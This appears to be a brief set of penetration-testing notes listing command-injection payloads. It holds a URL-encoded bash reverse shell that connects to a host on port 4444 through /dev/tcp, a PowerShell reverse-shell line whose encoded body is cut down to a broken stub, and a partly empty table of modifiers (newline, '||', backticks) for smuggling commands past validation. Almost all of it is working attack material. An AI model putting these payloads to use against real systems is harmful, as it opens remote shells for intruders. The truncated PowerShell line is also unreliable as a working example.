##### General payloads
```
// Linux (bash -c "bash -i >& /dev/tcp/192.168.45.241/4444 0>&1" --> URL Encode) 
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.241%2F4444%200%3E%261%22

// Windows (revshells.com --> powershell #4 --> URL Encode)
powershell%20-e%%3D%3D
```
##### Payload modifiers


| Payload | explanation |
| ---- | ---- |
| `%0A` | URL encoded newline, use when a command is ran, but validated |
| ` \|\| ` |  |
| \` \` | Runs the inside command in `bash` |
|  |  |
|  |  |
|  |  |
